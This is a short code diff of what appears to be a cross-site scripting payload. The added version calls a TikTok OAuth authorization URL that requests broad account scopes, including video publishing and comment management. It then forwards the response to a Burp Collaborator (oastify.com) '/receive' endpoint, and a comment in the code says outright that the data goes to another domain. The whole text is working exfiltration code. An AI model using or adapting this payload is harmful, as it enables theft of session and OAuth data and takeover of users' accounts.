@@ -1,14 +1,21 @@
-alert(1),
-fetch("https://znq9vh92t2f4j3fwna1au6nfm6s4gu4j.oastify.com/", {
+alert(2),
+fetch("https://tiktok.com/passport/open/web/auth/?client_key=7236493407642714114&scope=comment.list,video.publish,user.account.type,user.info.username,user.insights,user.info.basic,video.list,video.insights,comment.list.manage,user.info.stats&aid=1459&source=web&redirect_uri=https://tiktok.com/", {
   method: "POST",
   headers: {
     "Content-Type": "application/json",
   },
   body: JSON.stringify({
-    Test: "Test1",
-    key2: "value2",
   }),
 })
   .then(response => response.json())
-  .then(data => console.log(data))
+  .then(data => {
+    // Send the response to another domain
+    fetch("https://ibxsj0xlhl3n7m3fbtptipbyapgo4es3.oastify.com/receive", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(data),
+    });
+  })
   .catch(error => console.error('Error:', error));
